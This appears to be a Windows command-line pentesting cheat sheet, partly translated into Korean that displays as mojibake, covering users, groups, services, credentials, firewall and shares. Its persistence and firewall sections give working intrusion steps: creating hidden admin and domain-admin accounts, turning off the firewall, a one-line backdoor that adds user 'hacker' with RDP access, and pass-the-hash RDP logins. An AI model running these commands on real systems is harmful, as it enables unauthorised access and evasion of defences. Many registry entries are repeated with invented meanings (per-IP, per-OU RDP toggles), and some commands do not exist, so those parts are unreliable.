* **wevtutil**: ì´ë²¤íŠ¸ ë¡œê·¸ë¥¼ ì‚­ì œí•˜ëŠ” ë° ì‚¬ìš©ë˜ëŠ” ëª…ë ¹ì–´ì…ë‹ˆë‹¤.
* **sdelete**: ë¡œê·¸ íŒŒì¼ì„ ì•ˆì „í•˜ê²Œ ì‚­ì œí•˜ëŠ” ë° ì‚¬ìš©ë˜ëŠ” ëª…ë ¹ì¤„ ë„êµ¬ì…ë‹ˆë‹¤.

```bash
#Make a security query using another credentials
wevtutil qe security /rd:true /f:text /r:helpline /u:HELPLINE\zachary /p:0987654321
```

#### ì‚¬ìš©ì

**ì‚¬ìš©ì ê³„ì • ë§Œë“¤ê¸°**

```bash
net user <username> <password> /add
```

**ì‚¬ìš©ì ê³„ì • ì‚­ì œí•˜ê¸°**

```bash
net user <username> /delete
```

**ì‚¬ìš©ì ê³„ì • ë¹„ë°€ë²ˆí˜¸ ë³€ê²½í•˜ê¸°**

```bash
net user <username> <new_password>
```

**ì‚¬ìš©ì ê³„ì • ì •ë³´ ë³´ê¸°**

```bash
net user <username>
```

#### ê·¸ë£¹

**ê·¸ë£¹ ë§Œë“¤ê¸°**

```bash
net localgroup <groupname> /add
```

**ê·¸ë£¹ ì‚­ì œí•˜ê¸°**

```bash
net localgroup <groupname> /delete
```

**ê·¸ë£¹ì— ì‚¬ìš©ì ì¶”ê°€í•˜ê¸°**

```bash
net localgroup <groupname> <username> /add
```

**ê·¸ë£¹ì—ì„œ ì‚¬ìš©ì ì œê±°í•˜ê¸°**

```bash
net localgroup <groupname> <username> /delete
```

**ê·¸ë£¹ ì •ë³´ ë³´ê¸°**

```bash
net localgroup <groupname>
```

### ì„œë¹„ìŠ¤

#### ì„œë¹„ìŠ¤ ë³´ê¸°

```bash
sc query
```

#### ì„œë¹„ìŠ¤ ì‹œì‘í•˜ê¸°

```bash
sc start <servicename>
```

#### ì„œë¹„ìŠ¤ ì¤‘ì§€í•˜ê¸°

```bash
sc stop <servicename>
```

#### ì„œë¹„ìŠ¤ ì¬ì‹œì‘í•˜ê¸°

```bash
sc restart <servicename>
```

#### ì„œë¹„ìŠ¤ ì„¤ì • ë³€ê²½í•˜ê¸°

```bash
sc config <servicename> <option>
```

#### ì„œë¹„ìŠ¤ ì‚­ì œí•˜ê¸°

```bash
sc delete <servicename>
```

### íƒœìŠ¤í¬ ìŠ¤ì¼€ì¤„ëŸ¬

#### íƒœìŠ¤í¬ ìŠ¤ì¼€ì¤„ëŸ¬ ë³´ê¸°

```bash
schtasks /query
```

#### íƒœìŠ¤í¬ ìŠ¤ì¼€ì¤„ëŸ¬ ë§Œë“¤ê¸°

```bash
schtasks /create /tn <taskname> /tr <command> /sc <schedule> /st <starttime>
```

#### íƒœìŠ¤í¬ ìŠ¤ì¼€ì¤„ëŸ¬ ì‚­ì œí•˜ê¸°

```bash
schtasks /delete /tn <taskname> /f
```

#### íƒœìŠ¤í¬ ìŠ¤ì¼€ì¤„ëŸ¬ ì‹¤í–‰í•˜ê¸°

```bash
schtasks /run /tn <taskname>
```

#### íƒœìŠ¤í¬ ìŠ¤ì¼€ì¤„ëŸ¬ ì¤‘ì§€í•˜ê¸°

```bash
schtasks /end /tn <taskname>
```

```bash
#Me
whoami /all #All info about me, take a look at the enabled tokens
whoami /priv #Show only privileges

# Local users
net users #All users
dir /b /ad "C:\Users"
net user %username% #Info about a user (me)
net accounts #Information about password requirements
wmic USERACCOUNT Get Domain,Name,Sid
net user /add [username] [password] #Create user

# Other users looged
qwinsta #Anyone else logged in?

#Lauch new cmd.exe with new creds (to impersonate in network)
runas /netonly /user<DOMAIN>\<NAME> "cmd.exe" ::The password will be prompted

#Check current logon session as administrator using logonsessions from sysinternals
logonsessions.exe
logonsessions64.exe
```

#### ê·¸ë£¹

**ëª©ì **

ê·¸ë£¹ì€ ì‚¬ìš©ìë¥¼ ë…¼ë¦¬ì ìœ¼ë¡œ ê·¸ë£¹í™”í•˜ì—¬ ë¦¬ì†ŒìŠ¤ì— ëŒ€í•œ ì•¡ì„¸ìŠ¤ ê¶Œí•œì„ ê´€ë¦¬í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤. ê·¸ë£¹ì„ ì‚¬ìš©í•˜ë©´ ì‚¬ìš©ìì—ê²Œ ì¼ê´„ì ìœ¼ë¡œ ê¶Œí•œì„ í• ë‹¹í•˜ê³ , ë¦¬ì†ŒìŠ¤ì— ëŒ€í•œ ì•¡ì„¸ìŠ¤ë¥¼ ì‰½ê²Œ ì œì–´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**ê·¸ë£¹ ìƒì„±**

ê·¸ë£¹ì„ ìƒì„±í•˜ë ¤ë©´ ë‹¤ìŒ ëª…ë ¹ì„ ì‚¬ìš©í•©ë‹ˆë‹¤.

```plaintext
net group /add [ê·¸ë£¹ ì´ë¦„]
```

**ê·¸ë£¹ì— ì‚¬ìš©ì ì¶”ê°€**

ê·¸ë£¹ì— ì‚¬ìš©ìë¥¼ ì¶”ê°€í•˜ë ¤ë©´ ë‹¤ìŒ ëª…ë ¹ì„ ì‚¬ìš©í•©ë‹ˆë‹¤.

```plaintext
net group [ê·¸ë£¹ ì´ë¦„] [ì‚¬ìš©ì ì´ë¦„] /add
```

**ê·¸ë£¹ì—ì„œ ì‚¬ìš©ì ì œê±°**

ê·¸ë£¹ì—ì„œ ì‚¬ìš©ìë¥¼ ì œê±°í•˜ë ¤ë©´ ë‹¤ìŒ ëª…ë ¹ì„ ì‚¬ìš©í•©ë‹ˆë‹¤.

```plaintext
net group [ê·¸ë£¹ ì´ë¦„] [ì‚¬ìš©ì ì´ë¦„] /delete
```

**ê·¸ë£¹ ë©¤ë²„ì‹­ í™•ì¸**

ê·¸ë£¹ì˜ ë©¤ë²„ì‹­ì„ í™•ì¸í•˜ë ¤ë©´ ë‹¤ìŒ ëª…ë ¹ì„ ì‚¬ìš©í•©ë‹ˆë‹¤.

```plaintext
net group [ê·¸ë£¹ ì´ë¦„]
```

**ê·¸ë£¹ ì‚­ì œ**

ê·¸ë£¹ì„ ì‚­ì œí•˜ë ¤ë©´ ë‹¤ìŒ ëª…ë ¹ì„ ì‚¬ìš©í•©ë‹ˆë‹¤.

```plaintext
net group [ê·¸ë£¹ ì´ë¦„] /delete
```

```bash
#Local
net localgroup #All available groups
net localgroup Administrators #Info about a group (admins)
net localgroup administrators [username] /add #Add user to administrators

#Domain
net group /domain #Info about domain groups
net group /domain <domain_group_name> #Users that belongs to the group
```

#### ì„¸ì…˜ ëª©ë¡

To list the active sessions in a Windows system, you can use the following command:

```plaintext
C:\> net session
```

This command will display a list of all active sessions on the system, including the username, computer name, and session ID.

```
qwinsta
klist sessions
```

#### ì•”í˜¸ ì •ì±…

A password policy is a set of rules and requirements that dictate how passwords should be created and used within a system. It is an important aspect of security as weak passwords can be easily guessed or cracked, leaving systems vulnerable to unauthorized access.

ì•”í˜¸ ì •ì±…ì€ ì‹œìŠ¤í…œ ë‚´ì—ì„œ ì•”í˜¸ë¥¼ ìƒì„±í•˜ê³  ì‚¬ìš©í•˜ëŠ” ë°©ë²•ì„ ê·œì •í•˜ëŠ” ê·œì¹™ê³¼ ìš”êµ¬ì‚¬í•­ì˜ ì§‘í•©ì…ë‹ˆë‹¤. ì•½í•œ ì•”í˜¸ëŠ” ì‰½ê²Œ ì¶”ì¸¡ë˜ê±°ë‚˜ í¬ë™ë  ìˆ˜ ìˆìœ¼ë¯€ë¡œ, ì•”í˜¸ ì •ì±…ì€ ë³´ì•ˆì˜ ì¤‘ìš”í•œ ì¸¡ë©´ì…ë‹ˆë‹¤. ì´ëŠ” ì‹œìŠ¤í…œì´ ë¬´ë‹¨ ì ‘ê·¼ì— ì·¨ì•½í•´ì§€ëŠ” ê²ƒì„ ë°©ì§€í•©ë‹ˆë‹¤.

Some common password policy requirements include:

ì¼ë°˜ì ì¸ ì•”í˜¸ ì •ì±… ìš”êµ¬ì‚¬í•­ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

* Minimum password length: Specifies the minimum number of characters a password must have.
* ìµœì†Œ ì•”í˜¸ ê¸¸ì´: ì•”í˜¸ê°€ ê°€ì ¸ì•¼ í•˜ëŠ” ìµœì†Œ ë¬¸ì ìˆ˜ë¥¼ ì§€ì •í•©ë‹ˆë‹¤.
* Complexity requirements: Specifies that passwords must contain a combination of uppercase and lowercase letters, numbers, and special characters.
* ë³µì¡ì„± ìš”êµ¬ì‚¬í•­: ì•”í˜¸ëŠ” ëŒ€ë¬¸ì, ì†Œë¬¸ì, ìˆ«ì, íŠ¹ìˆ˜ ë¬¸ìì˜ ì¡°í•©ì„ í¬í•¨í•´ì•¼ í•©ë‹ˆë‹¤.
* Password expiration: Specifies a time period after which a password must be changed.
* ì•”í˜¸ ë§Œë£Œ: ì•”í˜¸ë¥¼ ë³€ê²½í•´ì•¼ í•˜ëŠ” ì‹œê°„ ê¸°ê°„ì„ ì§€ì •í•©ë‹ˆë‹¤.
* Password history: Specifies the number of previous passwords that cannot be reused.
* ì•”í˜¸ ê¸°ë¡: ì¬ì‚¬ìš©í•  ìˆ˜ ì—†ëŠ” ì´ì „ ì•”í˜¸ì˜ ìˆ˜ë¥¼ ì§€ì •í•©ë‹ˆë‹¤.
* Account lockout: Specifies the number of failed login attempts before an account is locked.
* ê³„ì • ì ê¸ˆ: ê³„ì •ì´ ì ê¸°ê¸° ì „ì— ì‹¤íŒ¨í•œ ë¡œê·¸ì¸ ì‹œë„ íšŸìˆ˜ë¥¼ ì§€ì •í•©ë‹ˆë‹¤.

By implementing a strong password policy, organizations can significantly enhance the security of their systems and protect sensitive information from unauthorized access.

ê°•ë ¥í•œ ì•”í˜¸ ì •ì±…ì„ ì‹œí–‰í•¨ìœ¼ë¡œì¨, ì¡°ì§ì€ ì‹œìŠ¤í…œì˜ ë³´ì•ˆì„ í¬ê²Œ í–¥ìƒì‹œí‚¬ ìˆ˜ ìˆìœ¼ë©°, ë¬´ë‹¨ ì ‘ê·¼ìœ¼ë¡œë¶€í„° ë¯¼ê°í•œ ì •ë³´ë¥¼ ë³´í˜¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```
net accounts
```

#### ìê²© ì¦ëª…

Credentials are the information used to authenticate and authorize a user or system. In the context of hacking, obtaining credentials is a common objective as it can provide unauthorized access to systems or accounts. There are various techniques and tools that can be used to obtain credentials, such as password cracking, phishing, keylogging, and credential stuffing. It is important for pentesters to understand how credentials are stored and protected in order to effectively test the security of a system.

```bash
cmdkey /list #List credential
vaultcmd /listcreds:"Windows Credentials" /all #List Windows vault
rundll32 keymgr.dll, KRShowKeyMgr #You need graphical access
```

#### ì‚¬ìš©ìë¥¼ ì´ìš©í•œ ì§€ì†ì„±

**Add a user to the local administrators group**

**ë¡œì»¬ ê´€ë¦¬ì ê·¸ë£¹ì— ì‚¬ìš©ì ì¶”ê°€**

```plaintext
net user /add <username> <password>
net localgroup administrators <username> /add
```

**Add a user to the remote desktop users group**

**ì›ê²© ë°ìŠ¤í¬í†± ì‚¬ìš©ì ê·¸ë£¹ì— ì‚¬ìš©ì ì¶”ê°€**

```plaintext
net localgroup "Remote Desktop Users" <username> /add
```

**Add a user to the domain administrators group**

**ë„ë©”ì¸ ê´€ë¦¬ì ê·¸ë£¹ì— ì‚¬ìš©ì ì¶”ê°€**

```plaintext
net group "Domain Admins" <username> /add /domain
```

**Add a user to the domain remote desktop users group**

**ë„ë©”ì¸ ì›ê²© ë°ìŠ¤í¬í†± ì‚¬ìš©ì ê·¸ë£¹ì— ì‚¬ìš©ì ì¶”ê°€**

```plaintext
net group "Remote Desktop Users" <username> /add /domain
```

**Enable remote desktop**

**ì›ê²© ë°ìŠ¤í¬í†± í™œì„±í™”**

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

**Disable remote desktop**

**ì›ê²© ë°ìŠ¤í¬í†± ë¹„í™œì„±í™”**

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
```

**Enable remote desktop on a specific port**

**íŠ¹ì • í¬íŠ¸ì—ì„œ ì›ê²© ë°ìŠ¤í¬í†± í™œì„±í™”**

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d <port_number> /f
```

**Disable remote desktop on a specific port**

**íŠ¹ì • í¬íŠ¸ì—ì„œ ì›ê²© ë°ìŠ¤í¬í†± ë¹„í™œì„±í™”**

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 0 /f
```

**Enable remote desktop on all network interfaces**

**ëª¨ë“  ë„¤íŠ¸ì›Œí¬ ì¸í„°í˜ì´ìŠ¤ì—ì„œ ì›ê²© ë°ìŠ¤í¬í†± í™œì„±í™”**

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v ListenOnAllInterfaces /t REG_DWORD /d 1 /f
```

**Disable remote desktop on all network interfaces**

**ëª¨ë“  ë„¤íŠ¸ì›Œí¬ ì¸í„°í˜ì´ìŠ¤ì—ì„œ ì›ê²© ë°ìŠ¤í¬í†± ë¹„í™œì„±í™”**

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v ListenOnAllInterfaces /t REG_DWORD /d 0 /f
```

**Enable remote desktop for a specific user**

**íŠ¹ì • ì‚¬ìš©ìë¥¼ ìœ„í•œ ì›ê²© ë°ìŠ¤í¬í†± í™œì„±í™”**

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 1 /f
```

**Disable remote desktop for a specific user**

**íŠ¹ì • ì‚¬ìš©ìë¥¼ ìœ„í•œ ì›ê²© ë°ìŠ¤í¬í†± ë¹„í™œì„±í™”**

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
```

**Enable remote desktop for multiple users**

**ë‹¤ì¤‘ ì‚¬ìš©ìë¥¼ ìœ„í•œ ì›ê²© ë°ìŠ¤í¬í†± í™œì„±í™”**

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
```

**Disable remote desktop for multiple users**

**ë‹¤ì¤‘ ì‚¬ìš©ìë¥¼ ìœ„í•œ ì›ê²© ë°ìŠ¤í¬í†± ë¹„í™œì„±í™”**

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 1 /f
```

**Enable remote desktop for all users**

**ëª¨ë“  ì‚¬ìš©ìë¥¼ ìœ„í•œ ì›ê²© ë°ìŠ¤í¬í†± í™œì„±í™”**

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
```

**Disable remote desktop for all users**

**ëª¨ë“  ì‚¬ìš©ìë¥¼ ìœ„í•œ ì›ê²© ë°ìŠ¤í¬í†± ë¹„í™œì„±í™”**

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 1 /f
```

**Enable remote desktop for a specific group**

**íŠ¹ì • ê·¸ë£¹ì„ ìœ„í•œ ì›ê²© ë°ìŠ¤í¬í†± í™œì„±í™”**

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
```

**Disable remote desktop for a specific group**

**íŠ¹ì • ê·¸ë£¹ì„ ìœ„í•œ ì›ê²© ë°ìŠ¤í¬í†± ë¹„í™œì„±í™”**

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 1 /f
```

**Enable remote desktop for all groups**

**ëª¨ë“  ê·¸ë£¹ì„ ìœ„í•œ ì›ê²© ë°ìŠ¤í¬í†± í™œì„±í™”**

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
```

**Disable remote desktop for all groups**

**ëª¨ë“  ê·¸ë£¹ì„ ìœ„í•œ ì›ê²© ë°ìŠ¤í¬í†± ë¹„í™œì„±í™”**

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 1 /f
```

**Enable remote desktop for a specific domain**

**íŠ¹ì • ë„ë©”ì¸ì„ ìœ„í•œ ì›ê²© ë°ìŠ¤í¬í†± í™œì„±í™”**

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
```

**Disable remote desktop for a specific domain**

**íŠ¹ì • ë„ë©”ì¸ì„ ìœ„í•œ ì›ê²© ë°ìŠ¤í¬í†± ë¹„í™œì„±í™”**

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 1 /f
```

**Enable remote desktop for all domains**

**ëª¨ë“  ë„ë©”ì¸ì„ ìœ„í•œ ì›ê²© ë°ìŠ¤í¬í†± í™œì„±í™”**

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
```

**Disable remote desktop for all domains**

**ëª¨ë“  ë„ë©”ì¸ì„ ìœ„í•œ ì›ê²© ë°ìŠ¤í¬í†± ë¹„í™œì„±í™”**

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 1 /f
```

**Enable remote desktop for a specific IP address**

**íŠ¹ì • IP ì£¼ì†Œë¥¼ ìœ„í•œ ì›ê²© ë°ìŠ¤í¬í†± í™œì„±í™”**

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
```

**Disable remote desktop for a specific IP address**

**íŠ¹ì • IP ì£¼ì†Œë¥¼ ìœ„í•œ ì›ê²© ë°ìŠ¤í¬í†± ë¹„í™œì„±í™”**

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 1 /f
```

**Enable remote desktop for all IP addresses**

**ëª¨ë“  IP ì£¼ì†Œë¥¼ ìœ„í•œ ì›ê²© ë°ìŠ¤í¬í†± í™œì„±í™”**

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
```

**Disable remote desktop for all IP addresses**

**ëª¨ë“  IP ì£¼ì†Œë¥¼ ìœ„í•œ ì›ê²© ë°ìŠ¤í¬í†± ë¹„í™œì„±í™”**

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 1 /f
```

**Enable remote desktop for a specific subnet**

**íŠ¹ì • ì„œë¸Œë„·ì„ ìœ„í•œ ì›ê²© ë°ìŠ¤í¬í†± í™œì„±í™”**

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
```

**Disable remote desktop for a specific subnet**

**íŠ¹ì • ì„œë¸Œë„·ì„ ìœ„í•œ ì›ê²© ë°ìŠ¤í¬í†± ë¹„í™œì„±í™”**

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 1 /f
```

**Enable remote desktop for all subnets**

**ëª¨ë“  ì„œë¸Œë„·ì„ ìœ„í•œ ì›ê²© ë°ìŠ¤í¬í†± í™œì„±í™”**

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
```

**Disable remote desktop for all subnets**

**ëª¨ë“  ì„œë¸Œë„·ì„ ìœ„í•œ ì›ê²© ë°ìŠ¤í¬í†± ë¹„í™œì„±í™”**

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 1 /f
```

**Enable remote desktop for a specific OU**

**íŠ¹ì • OUë¥¼ ìœ„í•œ ì›ê²© ë°ìŠ¤í¬í†± í™œì„±í™”**

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
```

**Disable remote desktop for a specific OU**

**íŠ¹ì • OUë¥¼ ìœ„í•œ ì›ê²© ë°ìŠ¤í¬í†± ë¹„í™œì„±í™”**

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 1 /f
```

```bash
# Add domain user and put them in Domain Admins group
net user username password /ADD /DOMAIN
net group "Domain Admins" username /ADD /DOMAIN

# Add local user and put them local Administrators group
net user username password /ADD
net localgroup Administrators username /ADD

# Add user to insteresting groups:
net localgroup "Remote Desktop Users" UserLoginName  /add
net localgroup "Debugger users" UserLoginName /add
net localgroup "Power users" UserLoginName /add
```

### ë„¤íŠ¸ì›Œí¬

#### ì¸í„°í˜ì´ìŠ¤, ë¼ìš°íŠ¸, í¬íŠ¸, í˜¸ìŠ¤íŠ¸ ë° DNS ìºì‹œ

```bash
ipconfig /all #Info about interfaces
route print #Print available routes
arp -a #Know hosts
netstat -ano #Opened ports?
type C:\WINDOWS\System32\drivers\etc\hosts
ipconfig /displaydns | findstr "Record" | findstr "Name Host"
```

#### ë°©í™”ë²½

A firewall is a network security device that monitors and controls incoming and outgoing network traffic based on predetermined security rules. It acts as a barrier between a trusted internal network and an untrusted external network, such as the internet. Firewalls can be implemented as hardware devices, software programs, or a combination of both.

ë°©í™”ë²½ì€ ë¯¸ë¦¬ ì •ì˜ëœ ë³´ì•ˆ ê·œì¹™ì— ë”°ë¼ ë“¤ì–´ì˜¤ê³  ë‚˜ê°€ëŠ” ë„¤íŠ¸ì›Œí¬ íŠ¸ë˜í”½ì„ ëª¨ë‹ˆí„°ë§í•˜ê³  ì œì–´í•˜ëŠ” ë„¤íŠ¸ì›Œí¬ ë³´ì•ˆ ì¥ì¹˜ì…ë‹ˆë‹¤. ì‹ ë¢°í•  ìˆ˜ ìˆëŠ” ë‚´ë¶€ ë„¤íŠ¸ì›Œí¬ì™€ ì¸í„°ë„·ê³¼ ê°™ì€ ì‹ ë¢°í•  ìˆ˜ ì—†ëŠ” ì™¸ë¶€ ë„¤íŠ¸ì›Œí¬ ì‚¬ì´ì— ì¥ë²½ ì—­í• ì„ í•©ë‹ˆë‹¤. ë°©í™”ë²½ì€ í•˜ë“œì›¨ì–´ ì¥ì¹˜, ì†Œí”„íŠ¸ì›¨ì–´ í”„ë¡œê·¸ë¨ ë˜ëŠ” ë‘˜ì˜ ì¡°í•©ìœ¼ë¡œ êµ¬í˜„ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```bash
netsh firewall show state # FW info, open ports
netsh advfirewall firewall show rule name=all
netsh firewall show config # FW info
Netsh Advfirewall show allprofiles

NetSh Advfirewall set allprofiles state off  #Turn Off
NetSh Advfirewall set allprofiles state on  #Trun On
netsh firewall set opmode disable #Turn Off

#How to open ports
netsh advfirewall firewall add rule name="NetBIOS UDP Port 138" dir=out action=allow protocol=UDP localport=138
netsh advfirewall firewall add rule name="NetBIOS TCP Port 139" dir=in action=allow protocol=TCP localport=139
netsh firewall add portopening TCP 3389 "Remote Desktop"

#Enable Remote Desktop
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh firewall add portopening TCP 3389 "Remote Desktop"
::netsh firewall set service remotedesktop enable #I found that this line is not needed
::sc config TermService start= auto #I found that this line is not needed
::net start Termservice #I found that this line is not needed

#Enable Remote Desktop with wmic
wmic rdtoggle where AllowTSConnections="0" call SetAllowTSConnections "1"
##or
wmic /node:remotehost path Win32_TerminalServiceSetting where AllowTSConnections="0" call SetAllowTSConnections "1"

#Enable Remote assistance:
reg add â€œHKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Serverâ€ /v fAllowToGetHelp /t REG_DWORD /d 1 /f
netsh firewall set service remoteadmin enable

#Ninja combo (New Admin User, RDP + Rassistance + Firewall allow)
net user hacker Hacker123! /add & net localgroup administrators hacker /add & net localgroup "Remote Desktop Users" hacker /add & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f & netsh firewall add portopening TCP 3389 "Remote Desktop" & netsh firewall set service remoteadmin enable

::Connect to RDP (using hash or password)
xfreerdp /u:alice /d:WORKGROUP /pth:b74242f37e47371aff835a6ebcac4ffe /v:10.11.1.49
xfreerdp /u:hacker /d:WORKGROUP /p:Hacker123! /v:10.11.1.49
```

#### ê³µìœ  í´ë”

ê³µìœ  í´ë”ëŠ” ì—¬ëŸ¬ ì‚¬ìš©ìê°€ íŒŒì¼ ë° í´ë”ë¥¼ ê³µìœ í•˜ê³  ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆëŠ” ê¸°ëŠ¥ì…ë‹ˆë‹¤. Windows ìš´ì˜ ì²´ì œì—ì„œëŠ” ê³µìœ  í´ë”ë¥¼ ì„¤ì •í•˜ì—¬ ë„¤íŠ¸ì›Œí¬ ìƒì—ì„œ íŒŒì¼ ë° í´ë”ë¥¼ ê³µìœ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**ê³µìœ  í´ë” í™•ì¸**

ê³µìœ  í´ë”ë¥¼ í™•ì¸í•˜ë ¤ë©´ ë‹¤ìŒ ëª…ë ¹ì„ ì‚¬ìš©í•©ë‹ˆë‹¤.

```plaintext
net share
```

**ê³µìœ  í´ë” ìƒì„±**

ìƒˆë¡œìš´ ê³µìœ  í´ë”ë¥¼ ìƒì„±í•˜ë ¤ë©´ ë‹¤ìŒ ëª…ë ¹ì„ ì‚¬ìš©í•©ë‹ˆë‹¤.

```plaintext
net share [ì´ë¦„]=[ê²½ë¡œ] /GRANT:[ì‚¬ìš©ì]:[ê¶Œí•œ]
```

* `[ì´ë¦„]`: ê³µìœ  í´ë”ì˜ ì´ë¦„ì„ ì§€ì •í•©ë‹ˆë‹¤.
* `[ê²½ë¡œ]`: ê³µìœ  í´ë”ì˜ ê²½ë¡œë¥¼ ì§€ì •í•©ë‹ˆë‹¤.
* `[ì‚¬ìš©ì]`: ê³µìœ  í´ë”ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆëŠ” ì‚¬ìš©ìë¥¼ ì§€ì •í•©ë‹ˆë‹¤.
* `[ê¶Œí•œ]`: ì‚¬ìš©ìì—ê²Œ ë¶€ì—¬í•  ê¶Œí•œì„ ì§€ì •í•©ë‹ˆë‹¤.

**ê³µìœ  í´ë” ì‚­ì œ**

ê¸°ì¡´ì˜ ê³µìœ  í´ë”ë¥¼ ì‚­ì œí•˜ë ¤ë©´ ë‹¤ìŒ ëª…ë ¹ì„ ì‚¬ìš©í•©ë‹ˆë‹¤.

```plaintext
net share [ì´ë¦„] /DELETE
```

* `[ì´ë¦„]`: ì‚­ì œí•  ê³µìœ  í´ë”ì˜ ì´ë¦„ì„ ì§€ì •í•©ë‹ˆë‹¤.

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

#### Wifi

#### ì™€ì´íŒŒì´

**View Available Networks**

**ì‚¬ìš© ê°€ëŠ¥í•œ ë„¤íŠ¸ì›Œí¬ ë³´ê¸°**

To view the list of available wifi networks, use the following command:

